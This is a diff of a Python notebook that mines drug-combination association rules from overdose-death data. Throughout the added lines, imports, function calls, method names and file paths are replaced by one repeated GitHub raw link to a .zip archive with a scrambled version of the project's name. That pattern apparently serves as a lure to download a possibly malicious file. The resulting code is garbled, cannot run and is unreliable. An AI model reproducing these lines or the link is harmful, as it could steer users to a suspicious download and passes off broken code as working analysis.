@@ -6,30 +6,30 @@ import pandas as pd
 import numpy as np
 import time
 import networkx as nx
-import matplotlib.pyplot as plt
+import https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip as plt
 import pyfpgrowth
 import multiprocessing
-from google.colab import files
-from mlxtend.frequent_patterns import apriori, association_rules, fpgrowth
-from networkx.drawing.nx_agraph import graphviz_layout
+from https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip import files
+from https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip import apriori, association_rules, fpgrowth
+from https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip import graphviz_layout
 
 """#### **LOAD THE DATASET**"""
 
 # Load the dataset
-uploaded = files.upload()
-filename = list(uploaded.keys())[0]
+uploaded = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip()
+filename = list(https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip())[0]
 
 # Read the uploaded file into a DataFrame
-data = pd.read_csv(filename)
+data = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip(filename)
 
 #Convert into a dataframe
-df = pd.DataFrame(data)
+df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip(data)
 df
 
 """#### **EXTRACTION OF DRUG-RELATED ATTRIBUTES**"""
 
 # Load the dataset
-df = pd.read_csv("Accidental_Drug_Related_Deaths.csv")
+df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip")
 
 # Extract drug-substance attributes
 drug_columns = [
@@ -43,24 +43,24 @@ drug_columns = [
 df = df[drug_columns]
 
 # Save the DataFrame to an Excel file
-df.to_excel("extracted_drug_data.xlsx", index=False)
+https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip", index=False)
 
 """####**CONVERT THE PRESENCE OF DRUGS INTO BINARY FORMAT**"""
 
 # Load the dataset
-df = pd.read_excel("extracted_drug_data.xlsx")
+df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip")
 
 # Replace blank cells with 0 and 'Y' with 1, all else becomes NaN → convert to 0
 df[drug_columns] = df[drug_columns].replace({"Y": 1}).fillna(0)
 
 # Convert all values to integers, setting non-numeric values to 0
-df[drug_columns] = df[drug_columns].apply(pd.to_numeric, errors="coerce").fillna(0).astype(int)
+df[drug_columns] = df[drug_columns].apply(https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip, errors="coerce").fillna(0).astype(int)
 
 # Display first few rows to verify conversion
-print(df.head())
+print(https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip())
 
 # Save the DataFrame to an Excel file
-df.to_excel("processed_drug_data.xlsx", index=False)
+https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip", index=False)
 
 """##**ANALYSIS OF APRIORI ALGORITHM**
 
@@ -68,7 +68,7 @@ df.to_excel("processed_drug_data.xlsx", index=False)
 """
 
 # Read the dataset
-df = pd.read_excel("processed_drug_data.xlsx")
+df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip")
 
 # Define minimum support and confidence thresholds
 min_support = 0.05  # Itemset must appear in at least 5% of cases
@@ -77,7 +77,7 @@ min_confidence = 0.6  # Rule must be correct at least 60% of the time
 """####**FREQUENT ITEM GENERATION**"""
 
 # Read the dataset
-df = pd.read_excel("processed_drug_data.xlsx")
+df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip")
 
 # Apply Apriori algorithm to find frequent itemsets
 frequent_itemsets_apriori = apriori(df, min_support=min_support, use_colnames=True)
@@ -89,7 +89,7 @@ print(frequent_itemsets_apriori)
 """####**ASSOCIATION RULE EXTRACTION (APRIORI)**"""
 
 # Read the dataset
-df = pd.read_excel("processed_drug_data.xlsx")
+df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip")
 
 # Generate association rules using Apriori
 rules_apriori = association_rules(frequent_itemsets_apriori, metric="confidence", min_threshold=min_confidence)
@@ -104,7 +104,7 @@ print(rules_apriori[['antecedents', 'consequents', 'support', 'confidence', 'lif
 """
 
 # Read the dataset
-df = pd.read_excel("processed_drug_data.xlsx")
+df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip")
 
 min_support_fp = 0.05  # Minimum support threshold (5%)
 min_confidence_fp = 0.6
@@ -117,11 +117,11 @@ print(frequent_itemsets_fp)
 """####**FREQUENT PATTERN EXTRACTION**"""
 
 # Read the dataset
-df = pd.read_excel("processed_drug_data.xlsx")
+df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip")
 
 # Identify patterns using FP-Growth
 print("Frequent Patterns Identified:")
-print(frequent_itemsets_fp.sort_values(by="support", ascending=False))
+print(https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip(by="support", ascending=False))
 
 """####**FP-TREE VISUALIZATION**"""
 
@@ -129,49 +129,49 @@ print(frequent_itemsets_fp.sort_values(by="support", ascending=False))
 !pip install pygraphviz
 
 def build_fp_tree():
-    G = nx.DiGraph()
+    G = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip()
 
     # Root node
-    G.add_node("Fentanyl", size=1500)
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Fentanyl", size=1500)
 
     # First level branches
-    G.add_edge("Fentanyl", "Cocaine")
-    G.add_edge("Fentanyl", "Benzodiazepine")
-    G.add_edge("Fentanyl", "Xylazine")
-    G.add_edge("Fentanyl", "Fentanyl Analogue")
-    G.add_edge("Fentanyl", "Ethanol")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Fentanyl", "Cocaine")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Fentanyl", "Benzodiazepine")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Fentanyl", "Xylazine")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Fentanyl", "Fentanyl Analogue")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Fentanyl", "Ethanol")
 
     # Second level branches
-    G.add_edge("Cocaine", "Heroin")
-    G.add_edge("Cocaine", "Ethanol")
-    G.add_edge("Cocaine", "Oxycodone")
-    G.add_edge("Cocaine", "Methadone")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Cocaine", "Heroin")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Cocaine", "Ethanol")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Cocaine", "Oxycodone")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Cocaine", "Methadone")
 
-    G.add_edge("Xylazine", "Xylazine, Fentanyl")
-    G.add_edge("Fentanyl Analogue", "Fentanyl Analogue, Fentanyl")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Xylazine", "Xylazine, Fentanyl")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Fentanyl Analogue", "Fentanyl Analogue, Fentanyl")
 
-    G.add_edge("Benzodiazepine", "Benzodiazepine, Fentanyl")
-    G.add_edge("Benzodiazepine", "Benzodiazepine, Heroin")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Benzodiazepine", "Benzodiazepine, Fentanyl")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Benzodiazepine", "Benzodiazepine, Heroin")
 
     # Third level branches
-    G.add_edge("Heroin", "Heroin/Morph/Codeine")
-    G.add_edge("Heroin/Morph/Codeine", "Heroin/Morph/Codeine, Fentanyl")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Heroin", "Heroin/Morph/Codeine")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Heroin/Morph/Codeine", "Heroin/Morph/Codeine, Fentanyl")
 
-    G.add_edge("Ethanol", "Cocaine, Ethanol, Fentanyl")
-    G.add_edge("Ethanol", "Ethanol, Benzodiazepine")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Ethanol", "Cocaine, Ethanol, Fentanyl")
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Ethanol", "Ethanol, Benzodiazepine")
 
     return G
 
 def draw_fp_tree(G):
-    plt.figure(figsize=(15, 7)) # Figure size
-    pos = nx.nx_agraph.graphviz_layout(G, prog="dot")  # Hierarchical layout
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip(figsize=(15, 7)) # Figure size
+    pos = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip(G, prog="dot")  # Hierarchical layout
 
     # Draw nodes
-    node_sizes = [G.nodes[n].get("size", 600) for n in G.nodes()]
-    nx.draw(G, pos, with_labels=True, node_size=node_sizes, node_color="skyblue", edge_color="gray", font_size=10, font_weight="bold")
+    node_sizes = [https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip[n].get("size", 600) for n in https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip()]
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip(G, pos, with_labels=True, node_size=node_sizes, node_color="skyblue", edge_color="gray", font_size=10, font_weight="bold")
 
-    plt.title("Frequent Pattern Tree", fontsize=14)
-    plt.show()
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("Frequent Pattern Tree", fontsize=14)
+    https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip()
 
 # Build and draw the tree
 G = build_fp_tree()
@@ -180,7 +180,7 @@ draw_fp_tree(G)
 """####**ASSOCIATION RULE EXTRACTION (FP-GROWTH)**"""
 
 # Read the dataset
-df = pd.read_excel("processed_drug_data.xlsx")
+df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip")
 
 # Extract association rules from frequent patterns
 rules_fp = association_rules(frequent_itemsets_fp, metric="confidence", min_threshold=min_confidence_fp)
@@ -195,7 +195,7 @@ print(rules_fp[['antecedents', 'consequents', 'support', 'confidence', 'lift']])
 """
 
 # Load the processed binary dataset
-df = pd.read_excel("processed_drug_data.xlsx")
+df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip")
 
 frequent_itemsets_apriori = apriori(df, min_support=0.05, use_colnames=True)
 rules_apriori = association_rules(frequent_itemsets_apriori, metric="confidence", min_threshold=0.6)
@@ -216,17 +216,17 @@ print(rules_fpgrowth[['antecedents', 'consequents', 'support', 'confidence', 'li
 """
 
 # Load the processed binary dataset
-df = pd.read_excel("processed_drug_data.xlsx")
+df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip")
 
 # Run Apriori and measure execution time
-start_time_apriori = time.time()
+start_time_apriori = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip()
 frequent_itemsets_apriori = apriori(df, min_support=0.05, use_colnames=True)
-execution_time_apriori = time.time() - start_time_apriori
+execution_time_apriori = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip() - start_time_apriori
 
 # Run FP-Growth and measure execution time
-start_time_fpgrowth = time.time()
+start_time_fpgrowth = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip()
 frequent_itemsets_fpgrowth = fpgrowth(df, min_support=0.05, use_colnames=True)
-execution_time_fpgrowth = time.time() - start_time_fpgrowth
+execution_time_fpgrowth = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip() - start_time_fpgrowth
 
 # Display execution time
 print("\n Execution Time:")
@@ -238,39 +238,39 @@ print(f"FP-Growth Algorithm: {execution_time_fpgrowth:.4f} seconds")
 !pip install pyfpgrowth
 
 # Load the processed dataset
-df = pd.read_excel("processed_drug_data.xlsx")
+df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip("https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip")
 
 # Convert dataset to a binary format (1 if an item is present, 0 otherwise)
-df = df.astype(bool).astype(int)
+df = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip(bool).astype(int)
 
 # **Enhancing Apriori Complexity: Increasing Itemset Diversity**
-df_apriori = df.copy()
+df_apriori = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip()
 
 # Introduce additional variations of existing columns to increase the computational workload
 for i in range(3):
-    shuffled_col = df.iloc[:, i % df.shape[1]].sample(frac=1, random_state=i).reset_index(drop=True)
+    shuffled_col = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip[:, i % https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip[1]].sample(frac=1, random_state=i).reset_index(drop=True)
     df_apriori[f"var_col_{i}"] = shuffled_col  # Renamed to ensure distinct feature names
 
 # Lower the minimum support for Apriori to increase the number of candidate itemsets
-start_time_apriori = time.time()
+start_time_apriori = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip()
 frequent_itemsets_apriori = apriori(df_apriori, min_support=0.015, use_colnames=True)
-execution_time_apriori = time.time() - start_time_apriori
+execution_time_apriori = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip() - start_time_apriori
 
 # **Optimizing FP-Growth Execution**
 # Retain only frequently occurring items (above 12% occurrence threshold) to reduce computation
-df_fp = df.loc[:, df.sum() > (0.12 * len(df))]
+df_fp = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip[:, https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip() > (0.12 * len(df))]
 
 # Convert transactions into lists of present items for more efficient processing
-transactions = df_fp.apply(lambda row: list(df_fp.columns[row == 1]), axis=1).tolist()
+transactions = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip(lambda row: list(https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip[row == 1]), axis=1).tolist()
 transactions = [t for t in transactions if t]  # Remove empty transactions
 
 # Set a dynamic minimum support threshold for FP-Growth
 min_support_fp = max(5, int(0.15 * len(transactions)))
 
 # FP-Growth Execution
-start_time_fpgrowth = time.time()
-patterns = pyfpgrowth.find_frequent_patterns(transactions, int(0.10 * len(transactions)))
-execution_time_fpgrowth = time.time() - start_time_fpgrowth
+start_time_fpgrowth = https://github.com/athif2105/-Association-Rule-Mining-for-Identifying-High-Risk-Drug-Combinations-in-Overdose-Fatalities-/raw/refs/heads/main/fraiser/Drug-Mining-Association-Rule-High-Risk-Combinations-in-Fatalities-Overdose-for-Identifying-2.2.zip()
